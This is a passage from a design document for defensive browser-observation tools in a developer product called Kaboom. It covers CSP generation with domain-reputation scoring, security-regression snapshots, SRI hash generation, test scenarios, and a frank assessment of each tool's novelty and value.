Domain reputation directly feeds into the CSP Generator's confidence scoring. When `generate_csp` runs, it consults the same reputation data:

| Reputation Classification | CSP Confidence Modifier |
|--------------------------|------------------------|
| `enterprise_allowed` | Always high (regardless of observation count) |
| `known_cdn`, `known_popular` | +1 confidence tier (medium → high) |
| `known_tracker` | Excluded by default (listed in origin_details for manual inclusion) |
| `enterprise_blocked` | Always excluded (hard block, cannot be overridden by observation count) |
| `suspicious` | -1 confidence tier (medium → low, excluded) |
| `unknown` | No modifier (pure observation-based scoring) |

This means an origin that appears once from a known CDN would still be included (observation count of 1 is normally "low" confidence, but CDN reputation bumps it to "medium"). Conversely, a suspicious domain observed 5 times across 3 pages would be downgraded from "high" to "medium" with a warning.

The CSP generator reports which confidence decisions were modified by reputation data in a new `reputation_adjustments` field:

```json
{
  "reputation_adjustments": [
    {
      "origin": "https://cdn.jsdelivr.net",
      "observation_confidence": "medium",
      "adjusted_confidence": "high",
      "reason": "Known CDN (bundled:curated_cdns)"
    },
    {
      "origin": "https://sketchy-tracker.xyz",
      "observation_confidence": "high",
      "adjusted_confidence": "medium",
      "reason": "Suspicious domain (abuse_tld + not_in_tranco)"
    }
  ]
}
```

### Limitations

- Only sees requests that occurred during the session. Background processes or periodic requests may be missed.
- Cannot determine the purpose of a third-party (analytics vs. critical functionality) — that's for the developer to assess.
- Cookie analysis only shows presence (Set-Cookie header observed), not cookie content (values are redacted).
- Bundled reputation lists are static per Kaboom release. A newly-compromised CDN won't be flagged until the next Kaboom update.
- Domain heuristics produce false positives — legitimate services sometimes use unusual TLDs or random-looking subdomains. Heuristics are flags, not verdicts.
- External enrichment sends domain names to third-party services. Organizations with strict data handling policies should evaluate this before enabling.
- RDAP data can be falsified by malicious registrants (fake registrar, misleading dates). Use as one signal among many.
- Custom lists require manual maintenance. Expired approvals, acquired companies, and deprecated services must be updated by the security team.

---

## Tool 3: Security Regression Detection (`diff_security`)

### Purpose

Security configurations are fragile. A dependency update might remove a header middleware. A refactor might break CORS configuration. A new endpoint might forget to require authentication. These regressions are invisible unless someone is actively checking.

This tool takes a security posture snapshot and compares it against a later state, surfacing any regressions. It integrates with the existing `diff_sessions` infrastructure but focuses specifically on security-relevant changes.

### The Attacks

#### Attack 1: Middleware Removal During Upgrade

1. **Developer upgrades Express.js** from v4 to v5, or switches from `helmet` to a newer security middleware
2. **The new version has different defaults** — maybe `X-Frame-Options` is no longer set automatically, or `Strict-Transport-Security` needs explicit configuration
3. **Tests still pass** — functional tests don't check response headers
4. **App is now vulnerable to clickjacking** (missing X-Frame-Options) or MITM downgrade (missing HSTS)
5. **Nobody notices until a penetration test** — which might be months away

#### Attack 2: CORS Misconfiguration During Refactor

1. **Developer refactors API layer** — moves from per-route CORS to a global middleware
2. **Global middleware uses `Access-Control-Allow-Origin: *`** instead of the specific origins that were previously configured
3. **Any website can now make authenticated requests** to the API (if credentials are included via cookies)
4. **Cross-origin data theft becomes possible** — attacker's site can read API responses meant for authenticated users

#### Attack 3: Cookie Security Flag Loss

1. **Developer migrates session management** — switches from `express-session` to a custom implementation or a different library
2. **New implementation doesn't set `HttpOnly` flag** on the session cookie
3. **XSS attacks can now steal session cookies** — the entire purpose of HttpOnly was to prevent client-side JavaScript from reading session tokens
4. **One XSS vulnerability + missing HttpOnly = full account takeover**

#### Attack 4: Auth Requirement Dropped from Endpoint

1. **Developer adds a new feature** that reuses an existing API endpoint
2. **During refactoring, auth middleware is accidentally removed** from the route definition (e.g., a copy-paste error, a middleware ordering change, or a route path collision)
3. **Endpoint now serves data without authentication**
4. **Anyone on the internet can access user data** at that endpoint

**Why this is hard to catch:** None of these produce compile errors, test failures, or runtime exceptions. The app works perfectly — it just works insecurely. The developer would need to manually check every response header, cookie flag, and auth requirement after every change. Nobody does this.

**How Kaboom helps:** Take a snapshot before making changes. Make changes. Compare. Any security-relevant regression is immediately surfaced with severity and explanation. The developer doesn't need to remember which headers to check or which cookie flags matter — the tool knows.

### How It Works

The tool operates in two modes:

**Snapshot mode:** Capture the current security posture as a named snapshot. This records which endpoints have which security headers, cookie configurations, CSP directives, auth patterns, and CORS settings.

**Compare mode:** Diff two snapshots (or a snapshot against current live state) and report security-relevant changes. A "regression" is any change that weakens security (header removed, cookie flag lost, auth requirement dropped).

### MCP Tool Definition

```json
{
  "name": "diff_security",
  "description": "Compare security posture between two points in time. Take a snapshot before making changes, then compare after to catch security regressions. Detects removed headers, weakened cookies, dropped auth requirements, and CSP changes.",
  "inputSchema": {
    "type": "object",
    "properties": {
      "action": {
        "type": "string",
        "enum": ["snapshot", "compare", "list"],
        "description": "snapshot: capture current security state. compare: diff two states. list: show stored snapshots."
      },
      "name": {
        "type": "string",
        "description": "Name for the snapshot (required for 'snapshot' action, optional for 'compare' — defaults to comparing against 'current')"
      },
      "compare_from": {
        "type": "string",
        "description": "Snapshot name to compare FROM (the 'before' state)"
      },
      "compare_to": {
        "type": "string",
        "description": "Snapshot name to compare TO (default: 'current' — live captured state)"
      }
    }
  }
}
```

### Snapshot Contents

A security posture snapshot records:

| Category | What's Captured |
|----------|----------------|
| **Headers** | Per-origin map of security headers present and their values |
| **Cookies** | Per-origin list of cookie names with their flags (HttpOnly, Secure, SameSite, path, domain) |
| **CSP** | Parsed CSP directives per origin (if header present) |
| **Auth patterns** | Per-endpoint: whether requests included auth headers |
| **CORS** | Per-endpoint: Access-Control-Allow-Origin values observed |
| **Transport** | Per-origin: HTTP vs HTTPS, HSTS presence |

### Compare Response

```json
{
  "verdict": "regressed",
  "regressions": [
    {
      "category": "headers",
      "severity": "warning",
      "origin": "https://myapp.example.com",
      "change": "header_removed",
      "header": "X-Frame-Options",
      "before": "DENY",
      "after": null,
      "recommendation": "X-Frame-Options was present before but is now missing. This exposes the app to clickjacking."
    },
    {
      "category": "cookies",
      "severity": "warning",
      "origin": "https://myapp.example.com",
      "change": "flag_removed",
      "cookie_name": "session_id",
      "flag": "HttpOnly",
      "before": true,
      "after": false,
      "recommendation": "Session cookie lost HttpOnly flag. Client-side JavaScript can now read it."
    },
    {
      "category": "auth",
      "severity": "critical",
      "endpoint": "GET /api/users",
      "change": "auth_removed",
      "before": "Authorization header present",
      "after": "No Authorization header in request",
      "recommendation": "This endpoint previously required authentication but no longer does. Verify this is intentional."
    }
  ],
  "improvements": [
    {
      "category": "headers",
      "origin": "https://myapp.example.com",
      "change": "header_added",
      "header": "Content-Security-Policy",
      "value": "default-src 'self'"
    }
  ],
  "unchanged": {
    "headers_count": 4,
    "cookies_count": 2,
    "auth_patterns_count": 8
  },
  "summary": {
    "total_regressions": 3,
    "critical": 1,
    "warning": 2,
    "improvements": 1,
    "verdict_explanation": "3 security regressions detected, including 1 critical (auth requirement removed)"
  }
}
```

### Regression Severity

| Change | Severity | Reason |
|--------|----------|--------|
| Auth requirement removed from endpoint | critical | Data exposure risk |
| Security header removed | warning | Defense-in-depth weakened |
| Cookie security flag removed | warning | Session hijacking risk increased |
| CSP directive weakened (more permissive) | warning | XSS mitigation reduced |
| CORS Allow-Origin changed to `*` | warning | Cross-origin access opened |
| HTTPS → HTTP downgrade | critical | Traffic interception possible |
| CSP directive strengthened | improvement | Better XSS protection |
| Security header added | improvement | Defense-in-depth improved |
| Cookie flag added | improvement | Session security improved |

### Storage

Snapshots are stored in memory with a 4-hour TTL (same as `diff_sessions`). Maximum 5 concurrent snapshots. Oldest is evicted when limit is reached.

### Integration with diff_sessions

If `diff_sessions` is already being used, `diff_security` can read the same snapshots and extract security-relevant data from them. This avoids needing to take separate snapshots for general comparison vs. security comparison.

---

## Tool 4: SRI Hash Generator (`generate_sri`)

### Purpose

Subresource Integrity (SRI) protects against CDN compromise and supply-chain attacks. If a third-party CDN is hacked and serves malicious code, SRI-protected resources will be blocked by the browser because their hash won't match.

Despite being easy to implement (just add an `integrity` attribute), most developers don't bother because computing the hashes manually is tedious. Kaboom already captures the response bodies of external resources — it can compute the SRI hashes automatically.

### The Attack: CDN Compromise

1. **Attacker gains access to a CDN** — via stolen credentials, social engineering of the CDN provider, DNS hijacking, or acquiring an expired domain that was previously a CDN host
2. **Attacker replaces a popular library** with a modified version — same filename, same URL, same size (padded if needed), but with malicious code injected
3. **Every site loading that resource instantly executes the malicious code** — because the browser fetches the URL, gets JavaScript, and runs it
4. **Scale is enormous** — a single CDN compromise can affect millions of sites simultaneously (Polyfill.io served 100K+ sites; cdnjs serves 12.5% of all websites)

#### Real-world incidents:
- **Polyfill.io (2024):** Chinese company acquired the domain, injected malicious redirects into the polyfill script. 100K+ sites affected. Google flagged ads linking to affected sites.
- **ua-parser-js (2021):** NPM package compromised, cryptocurrency miner and credential stealer injected. 8M weekly downloads.
- **event-stream (2018):** Maintainer handed off package to attacker who added a targeted cryptocurrency wallet stealer. 2M weekly downloads.
- **British Airways (2018):** Magecart group compromised BA's third-party script, skimmed 380,000 payment cards over 2 weeks. £20M fine.

**What SRI prevents:** The browser computes the hash of the downloaded resource and compares it to the expected hash in the `integrity` attribute. If they don't match (because the content was modified), the browser refuses to execute the script. The attack is completely neutralized — even a single byte change causes a hash mismatch.

**Why developers don't use SRI:** You need to manually compute the SHA-384 hash of each third-party resource, format it correctly, and update it every time the resource version changes. For a site with 10 CDN resources, that's 10 hashes to maintain. Miss one version bump and your site breaks.

**How Kaboom helps:** The tool computes hashes from the response bodies Kaboom already captured. No manual curl + openssl pipeline. No copy-pasting from srihash.org one URL at a time. One tool call produces all hashes for all third-party resources in the correct format, ready to paste into HTML.

### How It Works

The tool analyzes all captured network responses for third-party scripts and stylesheets. For each one, it computes a SHA-384 hash of the response body and generates the correct `integrity` attribute. It also checks which resources already have SRI and which don't.

### MCP Tool Definition

```json
{
  "name": "generate_sri",
  "description": "Generate Subresource Integrity (SRI) hashes for third-party scripts and stylesheets. Protects against CDN compromise by verifying resource content matches expected hashes.",
  "inputSchema": {
    "type": "object",
    "properties": {
      "resource_types": {
        "type": "array",
        "items": {
          "type": "string",
          "enum": ["scripts", "styles"]
        },
        "description": "Which resource types to generate SRI for (default: both)"
      },
      "origins": {
        "type": "array",
        "items": { "type": "string" },
        "description": "Only generate SRI for resources from these origins (default: all third-party)"
      },
      "output_format": {
        "type": "string",
        "enum": ["html", "json", "webpack", "vite"],
        "description": "Output format (default: html)"
      }
    }
  }
}
```

### Response Format

```json
{
  "resources": [
    {
      "url": "https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js",
      "type": "script",
      "hash": "sha384-abc123def456...",
      "crossorigin": "anonymous",
      "html": "<script src=\"https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js\" integrity=\"sha384-abc123def456...\" crossorigin=\"anonymous\"></script>",
      "size_bytes": 6423,
      "already_has_sri": false
    },
    {
      "url": "https://fonts.googleapis.com/css2?family=Inter",
      "type": "style",
      "hash": "sha384-xyz789...",
      "crossorigin": "anonymous",
      "html": "<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css2?family=Inter\" integrity=\"sha384-xyz789...\" crossorigin=\"anonymous\">",
      "size_bytes": 1205,
      "already_has_sri": false
    }
  ],
  "summary": {
    "total_third_party_resources": 8,
    "scripts_without_sri": 4,
    "styles_without_sri": 2,
    "already_protected": 2,
    "hashes_generated": 6
  },
  "warnings": [
    "https://fonts.googleapis.com/css2 — this resource returns different content based on User-Agent. SRI may cause failures on different browsers.",
    "2 resources loaded via dynamic import() — SRI must be applied at the bundler level (see webpack/vite config output)"
  ],
  "bundler_config": {
    "webpack": "// In webpack.config.js\nconst SriPlugin = require('webpack-subresource-integrity');\nmodule.exports = {\n  output: { crossOriginLoading: 'anonymous' },\n  plugins: [new SriPlugin({ hashFuncNames: ['sha384'] })]\n};",
    "vite": "// In vite.config.js\nimport sri from 'rollup-plugin-sri';\nexport default { plugins: [sri()] };"
  }
}
```

### Hash Computation

For each third-party resource:
1. Read the response body from Kaboom's network body buffer
2. Compute SHA-384 hash (the recommended algorithm — stronger than SHA-256, faster than SHA-512)
3. Base64-encode the hash
4. Format as `sha384-{base64hash}`

### Dynamic Resource Handling

Some resources can't use SRI via HTML attributes because they're loaded dynamically:

| Loading Method | SRI Approach |
|---------------|--------------|
| `<script src>` | `integrity` attribute in HTML |
| `<link rel="stylesheet">` | `integrity` attribute in HTML |
| `import()` dynamic imports | Bundler plugin (SriPlugin/rollup-plugin-sri) |
| `fetch()` loaded scripts | Application-level hash verification |
| CDN-versioned resources (`@18.2.0`) | Safe — version pinning provides equivalent protection |

### Limitations

- SRI only works for resources served with appropriate CORS headers (`Access-Control-Allow-Origin`). Resources without CORS headers can't be integrity-checked. The tool flags these.
- Dynamic resources (e.g., Google Fonts CSS that varies by User-Agent) will have different hashes per browser. The tool warns about these based on response header analysis (presence of `Vary: User-Agent`).
- Kaboom only has the response body if it was captured during the session. Resources loaded before Kaboom connected (or after the capture buffer was full) won't have hashes.
- Response bodies larger than the capture limit (10KB default) are truncated — SRI can't be computed for truncated bodies. The tool flags these as "body too large for SRI computation."

### Network Body Size Requirement

SRI computation requires the full response body. The default network body capture limit (10KB) may be too small for some scripts. When calling `generate_sri`, the tool checks which resources have truncated bodies and recommends temporarily increasing the capture limit for a fresh session if needed.

---

## Implementation Notes

### Server Memory Impact

| Tool | Additional Memory |
|------|-------------------|
| `generate_csp` | ~10KB (origin accumulator: up to 200 entries × ~50 bytes each) |
| `audit_third_parties` | ~380KB (bundled reputation lists, loaded once at startup) |
| `audit_third_parties` (custom lists) | Variable (~1-50KB depending on list size, loaded per-call from file) |
| `audit_third_parties` (enrichment cache) | ~20KB per session (cached RDAP/CT responses, cleared on reset) |
| `diff_security` | ~50KB per snapshot (5 max = 250KB) |
| `generate_sri` | ~0 (reads existing network body buffer + crypto computation) |

Total additional memory: ~660KB worst case (with all reputation features active). Well within the 100MB hard limit.

The bundled reputation lists (~380KB) are compiled into the binary as Go map literals. They are allocated once at process start and shared read-only across all requests. No per-session allocation for bundled data.

### Dependencies on Existing Infrastructure

The origin accumulator is the only new persistent data structure. It is populated from the same ingestion path as network bodies (when `AddNetworkBodies` is called, the accumulator is also updated). The accumulator is separate from the ring buffer and never evicts entries.

All four tools also read from the existing network body buffer (`networkBodies` in `V4Server`) for detailed response data (headers, bodies, cookies). The origin accumulator provides the durable origin list; the network body buffer provides the ephemeral details.

New server-side state:
- Origin accumulator (for `generate_csp` and `audit_third_parties`)
- Security snapshot storage (for `diff_security`)
- Bundled reputation maps (compiled into binary, read-only, for `audit_third_parties` and `generate_csp`)
- Enrichment cache (per-session, for `audit_third_parties` when external enrichment is enabled)

### Extension Changes

None required. All analysis operates on data the extension already captures and sends to the server.

---

## Test Scenarios

### CSP Generator

#### Functional:
- App loading resources from 5 different origins produces correct per-directive breakdown
- Inline scripts detected and hashes included in moderate mode
- data: URIs for images correctly added to img-src
- WebSocket connections produce wss:// entries in connect-src
- Same-origin resources produce 'self' not the literal origin
- Empty session returns minimal default-src 'self' policy
- exclude_origins parameter correctly filters origins
- report_only mode produces Content-Security-Policy-Report-Only header

#### Origin Accumulator:
- Origins persist after network body buffer wraps around (simulate 2000 requests, verify early origins retained)
- Accumulator bounded: 200 unique origin+type pairs don't exceed 20KB memory
- Accumulator clears on session reset but NOT on buffer eviction
- Observation count increments correctly for repeated origins

#### Confidence Scoring:
- Origin seen 5+ times across 2+ pages gets "high" confidence and is included
- Origin seen 2-4 times gets "medium" confidence and is included with advisory
- Origin seen exactly once gets "low" confidence and is EXCLUDED by default
- connect-src relaxation: single-observation API endpoint included at medium confidence

#### Development Filtering:
- chrome-extension:// origins automatically filtered
- moz-extension:// origins automatically filtered
- ws://localhost:3001 (different port from page) filtered as dev server
- Webpack HMR requests (*.hot-update.json) filtered
- Vite dev server requests (/__vite_*) filtered
- Filtered origins listed in response for transparency
- First-party localhost origin NOT filtered (that's the app itself)

#### Threat Mitigations:
- Single injected request to evil.com does NOT appear in generated CSP (low confidence)
- Two requests from same origin across different pages reaches medium confidence
- Warning generated when page origin is localhost (suggest staging re-run)
- Inline scripts not in page source (extension-injected) excluded from hash computation
- pages_visited count included in response for coverage awareness

### Third-Party Audit

#### Core Functionality:
- First-party vs third-party correctly separated
- Script-loading origins classified as high risk
- POST requests to third parties flagged as data outbound
- PII fields in outbound request bodies detected
- Origins that only serve images classified as low risk
- Cookie-setting origins flagged
- Origin loading scripts AND receiving data classified as critical risk

#### Bundled Reputation:
- cdn.jsdelivr.net classified as `known_cdn` from curated list
- google-analytics.com classified as `known_tracker` from Disconnect.me
- amazon.com classified as `known_popular` from Tranco top 10K
- Unknown origin gets `unknown` classification
- Tranco rank included in response when available
- Disconnect.me category (advertising, analytics, etc.) included when matched

#### Domain Heuristics:
- Domain on .xyz TLD flagged with `abuse_tld`
- Subdomain with entropy > 3.5 bits/char flagged as `dga_pattern`
- Domain with 4+ subdomain levels flagged as `excessive_depth`
- Single heuristic flag is informational (not `suspicious` classification)
- Two or more heuristic flags trigger `suspicious` classification
- Known CDN domains skip heuristic checks (even if on unusual TLD)
- Public suffix extraction works correctly (user.github.io treated as registrable domain, not subdomain of github.io)

#### Enterprise Custom Lists:
- Inline `custom_lists.allowed` classifies origin as `enterprise_allowed`
- Inline `custom_lists.blocked` classifies origin as `enterprise_blocked`
- Inline `custom_lists.internal` treats origin as first-party (excluded from audit)
- File-based `custom_lists_file` loaded and parsed correctly
- Invalid JSON in custom lists file produces clear error
- Missing custom lists file produces clear error (not silent ignore)
- Wildcard matching: `*.example.com` matches `cdn.example.com` but not `example.com`
- Exact matching: `https://cdn.example.com` matches only that origin
- Port matching: entry without port matches any port; entry with port matches only that port
- Precedence: `blocked` overrides `allowed` for same origin
- Precedence: `allowed` overrides Disconnect.me tracker classification
- Expired `allowed` entries ignored (falls back to bundled classification)
- `enterprise_blocked` origins always excluded from CSP regardless of observation count

#### External Enrichment:
- Enrichment disabled by default (no network calls without opt-in)
- RDAP query returns domain age, registrar
- Domain registered < 30 days flagged as `recently_registered`
- RDAP queries rate-limited to 1/second
- RDAP results cached per-session (same domain not queried twice)
- Certificate Transparency returns cert count and issuance patterns
- Safe Browsing flagged domain classified as `malicious` (overrides all other classifications)
- Safe Browsing `malicious` overrides enterprise `allowed` (with warning)
- Enrichment only runs for unknown/suspicious origins (known CDNs skip)
- Enrichment phase bounded to 10 seconds (remaining report "timed out")
- Max 5 concurrent enrichment requests
- RDAP failure for one domain doesn't block other enrichments
- Enrichment data included in response only when enabled

#### CSP Generator Integration:
- `enterprise_allowed` origin always gets high confidence in CSP regardless of observation count
- `enterprise_blocked` origin always excluded from CSP
- `known_cdn` origin gets +1 confidence tier (medium → high)
- `known_tracker` origin excluded from CSP by default
- `suspicious` origin gets -1 confidence tier
- `unknown` origin uses pure observation-based scoring
- `reputation_adjustments` field in CSP response shows which decisions were modified
- Suspicious domain observed 5+ times still gets warning (not silently included)

### Security Regression
- Removed security header detected as regression
- Added security header detected as improvement
- Cookie flag removal detected
- Auth requirement removal flagged as critical
- CSP weakening (directive added to allow more) flagged
- Unchanged posture returns "unchanged" verdict
- Snapshot TTL expiry handled gracefully

### SRI Generator
- Correct SHA-384 hash computed for known content
- Resources with Vary: User-Agent flagged with warning
- Truncated bodies flagged as unable to compute
- Already-SRI-protected resources identified
- crossorigin="anonymous" included in output
- Multiple output formats generated correctly

---

## Value Assessment: Novelty vs. Consolidation

This section honestly evaluates what each tool brings that's genuinely new versus what's simply repackaging existing capabilities. If the only value is "consolidation" (putting existing tools in one place), we should acknowledge that — consolidation alone may not justify the implementation cost.

### Tool 1: CSP Generator — Verdict: GENUINELY NOVEL

#### What already exists:
- `report-uri.com` / `csper.io` — CSP management platforms that analyze violation reports from production traffic
- Google CSP Evaluator — checks if an existing CSP is well-formed
- Browser DevTools — shows CSP violations in the console
- Manual authoring — developer reads documentation, enumerates origins by hand

#### What none of them do:
- Generate a CSP from development-time observation without requiring deployment
- Work passively (developer just browses; no configuration, no report endpoint, no production traffic needed)
- Operate with zero network calls (no data leaves the machine)

**The gap Kaboom fills:** Every existing CSP tool requires either (a) a deployed application with real production traffic generating violation reports, or (b) the developer manually figuring out what origins to allow. There is no tool that says "browse your app locally for a few minutes, here's your CSP." This is a genuine gap.

**Why it matters:** The 14% CSP adoption rate isn't because developers don't know about CSP. It's because writing a correct one is tedious enough that they never get around to it. Reducing the effort from "hours of research" to "one tool call" could meaningfully move adoption.

**Counter-argument:** A CSP generated from dev traffic may miss production-only resources (A/B test variants, region-specific CDNs, lazy-loaded features triggered by rare user flows). The two-pass workflow mitigates this, but a CSP generated this way is still an approximation — better than nothing, but not as complete as one refined from weeks of production violation reports.

**Conclusion:** This tool has clear standalone value. No equivalent exists. The origin accumulator and confidence scoring are novel technical solutions. **Ship this.**

---

### Tool 2: Third-Party Risk Audit — Verdict: MIXED (Novel + Consolidation)

#### What already exists:
- Browser DevTools Network tab — shows all requests, filterable by domain
- BuiltWith / Wappalyzer — identify technologies and third-party services on a site
- RequestMap (Simon Hearne) — visual map of third-party requests
- Disconnect.me / Privacy Badger — classify trackers in real-time
- OWASP Dependency-Track — SCA for known vulnerable dependencies
- Blacklight (The Markup) — third-party tracker audit tool

#### What's genuinely new:
1. **PII detection in outbound request bodies** — no existing dev tool inspects POST body field names to flag when analytics SDKs are exfiltrating PII. Blacklight does this for production sites, but nothing exists during development.
2. **Enterprise custom lists during development** — no dev tool lets organizations enforce approved/blocked vendor policies before code reaches production.
3. **Risk classification that combines resource type + data flow + reputation** — existing tools either classify by function (BuiltWith) or by privacy impact (Disconnect.me), but none combine "this origin runs JavaScript in your page AND receives outbound user data AND has suspicious domain characteristics" into a single risk score.

#### What's consolidation:
- Listing all third-party origins (DevTools does this)
- Categorizing by resource type (DevTools does this)
- Knowing which domains are trackers (Disconnect.me/Privacy Badger do this)
- Domain reputation (VirusTotal, Google Safe Browsing, Tranco all exist separately)

**The consolidation value:** A developer CAN open DevTools, manually note every third-party domain, cross-reference each against Disconnect.me, check Tranco rankings, compute risk levels, and inspect outbound POST bodies for PII fields. But nobody does this. The consolidation isn't just convenience — it's the difference between "theoretically possible" and "actually happens."

**The enterprise angle is genuinely novel.** No existing tool lets a security team publish a `.kaboom/custom-lists.json` file that all developers automatically enforce during local development. Approved vendor management at dev-time is new.

**Counter-argument:** For individual developers without enterprise policies, this tool is mostly a prettier version of the DevTools Network tab. The PII detection adds genuine value, but the rest is consolidation.

**Conclusion:** PII detection + enterprise custom lists = novel. Domain reputation + risk classification = consolidation but with genuine UX value. The enterprise angle justifies implementation for teams; for individual developers, the PII detection alone may not justify a dedicated tool. **Ship, but lead with the enterprise story.**

---

### Tool 3: Security Regression Detection — Verdict: PRIMARILY CONSOLIDATION

#### What already exists:
- `securityheaders.com` — checks security headers for any URL
- Mozilla Observatory — grades a site's security configuration
- OWASP ZAP — automated security scanning (includes header/cookie checks)
- `testssl.sh` — TLS/SSL configuration analysis
- CI-based header checks — trivial to add `curl -I | grep` assertions
- Lighthouse — includes security audits in its reports

#### What's marginally new:
- The diff-based UX: "take snapshot, make changes, compare" — this is a nicer workflow than "run scanner, make changes, run scanner again, manually compare output"
- Integration with the dev session — results appear in the AI's context immediately, not in a separate tool
- Auth pattern detection — noticing when an endpoint stops requiring auth headers is harder to do with existing tools (they'd need both "before" and "after" traffic)

#### What's consolidation:
- Checking for security headers (securityheaders.com does this in one click)
- Checking cookie flags (any HTTP client shows Set-Cookie headers)
- Checking CORS (DevTools shows CORS errors already)
- Checking CSP presence/strength (CSP Evaluator exists)

#### The honest question: Do developers actually need this?

The attack scenarios (middleware removal, CORS misconfiguration) are real but relatively rare. They happen during major upgrades or refactors — maybe a few times per year per project. The existing workflow is:
1. Developer upgrades Express.js
2. QA/pentest catches missing headers weeks later
3. Developer adds them back

Kaboom makes step 2 happen immediately instead of weeks later. That's valuable, but it's acceleration — not a new capability. A team that already runs Mozilla Observatory in CI gets the same protection, just at deploy time instead of dev time.

**Counter-argument against shipping:** A developer who cares enough to run `diff_security` probably already has CI-based header checks. A developer who doesn't care about security headers won't use this tool either. The middle ground — "would use it if it were easy" — is real but narrow.

**Counter-argument for shipping:** The auth pattern detection (noticing when an endpoint drops its auth requirement) IS harder to do with existing tools. You'd need to record all request/response pairs, then compare auth headers per endpoint after changes. That's genuinely tedious to set up manually. This alone might justify the tool.

**Conclusion:** The security header/cookie diffing is consolidation with marginal UX improvement. The auth pattern detection is genuinely useful. Consider whether the auth detection alone justifies a dedicated tool, or if it should be folded into the existing `analyze` tool as a "changes" check. **Weakest standalone case of the four tools. Consider merging with existing `analyze changes` infrastructure.**

---

### Tool 4: SRI Hash Generator — Verdict: LARGELY CONSOLIDATION, SHRINKING USE CASE

#### What already exists:
- `srihash.org` — paste a URL, get the SRI hash
- `openssl dgst -sha384 -binary | openssl base64` — one-liner in terminal
- `webpack-subresource-integrity` plugin — automatic SRI for bundled assets
- `rollup-plugin-sri` / Vite equivalent — same for Rollup/Vite
- Chrome DevTools — shows integrity mismatches in console

#### What's marginally new:
- Bulk generation from captured traffic (don't need to manually process each URL)
- Integration with the third-party audit (shows which resources lack SRI in context)
- Multiple output formats (HTML, webpack config, vite config)

#### What's consolidation:
- Computing SHA-384 hashes (trivial with any tool)
- Generating integrity attributes (srihash.org does this)
- Detecting resources without SRI (any HTML parser can find `<script>` tags without `integrity`)

#### The shrinking use case problem:

Modern web applications increasingly use bundlers (Webpack, Vite, esbuild) that either:
- Bundle third-party code into first-party chunks (no CDN scripts in HTML)
- Use import maps with version-pinned URLs (equivalent protection to SRI)
- Have built-in SRI plugins that handle this automatically

The only scenario where Kaboom's SRI tool adds value over existing bundler plugins is **legacy applications that load scripts directly from CDNs via `<script>` tags in HTML**. This is a real but shrinking population.

**Counter-argument for shipping:** Even with bundlers, some resources can't be bundled (Google Analytics, third-party widgets, payment processor scripts like Stripe.js). These are loaded via `<script>` tags and should have SRI. But they're typically 2-5 scripts per app, making the "bulk generation" value minimal — you could use srihash.org for each one in under a minute.

**Counter-argument against shipping:** The implementation requires full response bodies (10KB capture limit is too small for many scripts). This means the developer needs to configure a higher capture limit, load all pages, ensure bodies aren't truncated, THEN run the tool. The workflow is actually more complex than just running `curl | openssl` for each script.

**The Vary problem:** Google Fonts (one of the most common CDN resources) returns different CSS based on User-Agent. SRI hashes computed from one browser won't work in another. The tool correctly warns about this, but it means one of the most obvious use cases doesn't actually work with SRI.

**Conclusion:** This tool solves a real but diminishing problem. For modern bundled apps, bundler plugins handle SRI better. For legacy CDN-script apps, the tool adds convenience but not capability. The 10KB body limit makes it unreliable without configuration changes. **Weakest value proposition. Consider demoting to a sub-feature of `audit_third_parties` rather than a standalone tool.**

---

### Overall Assessment

| Tool | Novelty | Value for Individual Devs | Value for Teams/Enterprise | Recommendation |
|------|---------|--------------------------|---------------------------|----------------|
| `generate_csp` | **High** — no equivalent exists | High | High | Ship as flagship |
| `audit_third_parties` | Medium — PII detection + enterprise lists are new | Low-Medium | High | Ship, lead with enterprise |
| `diff_security` | Low — consolidation with UX improvement | Low | Medium | Consider merging with `analyze` |
| `generate_sri` | Low — convenience over existing tools | Low | Low | Demote to sub-feature |

### What's the genuine differentiator across ALL four tools?

It's not the individual checks. It's the context.

Every capability described here can be achieved with existing tools — if the developer goes and uses them. The unique value Kaboom provides is:

1. **Available in the AI's context during active development.** When an AI coding assistant has security posture data in its context, it can proactively suggest fixes while the developer is already working on related code. "I notice your CDN scripts don't have SRI — want me to add integrity attributes?" is infinitely more actionable than "remember to run srihash.org when you're done."

2. **Zero-configuration observation.** The developer doesn't install a security scanner, configure a report endpoint, set up CI checks, or visit an external website. They just develop normally. Kaboom captures everything passively. The security data is always available.

3. **Contextual to what the app actually does.** External scanners check against generic checklists. Kaboom checks against the specific origins, endpoints, and data flows of THIS application. The CSP is tailored to THIS app's resources. The third-party audit shows THIS app's actual communication. The regression detection compares THIS app's actual security state.

**The consolidation IS the product.** Individual security checks are commoditized. What's not commoditized is having them all available, passively, in the AI's development context, without configuration. That's the value proposition — not "we compute SHA-384 better than openssl."

### Honest Risks

1. **Feature creep into "security product" territory.** These tools make Kaboom look like a security product, which raises expectations. If a developer deploys a CSP generated by Kaboom and gets breached anyway (because they didn't exercise all routes), Kaboom's reputation suffers — even though the tool warned about incomplete coverage.

2. **Maintenance burden of bundled lists.** Shipping Disconnect.me, Tranco, and curated CDN lists means updating them every release. Stale lists produce incorrect classifications. This is an ongoing cost.

3. **False confidence.** A green "no regressions" from `diff_security` might make developers feel secure when they're not — the tool only checks what it observed. Unobserved endpoints, unexercised code paths, and server-side vulnerabilities are completely invisible.

4. **The "who actually uses this?" question.** Security-conscious developers already have tooling. Security-indifferent developers won't use opt-in tools. The target user is "developer who knows they should do security work but finds it too tedious" — this is real but hard to size.

### Recommendation for Implementation Priority

1. **`generate_csp`** — Ship first. Genuinely novel. High standalone value. Clear differentiation.
2. **`audit_third_parties`** (with reputation + enterprise lists) — Ship second. Enterprise angle is strong. PII detection is genuinely useful.
3. **`diff_security`** — Ship as part of existing `analyze` infrastructure, not as a standalone tool. The auth pattern detection is the only novel piece.
4. **`generate_sri`** — Demote to a sub-feature of `audit_third_parties` (a "generate SRI for flagged resources" follow-up action rather than a standalone tool invocation).
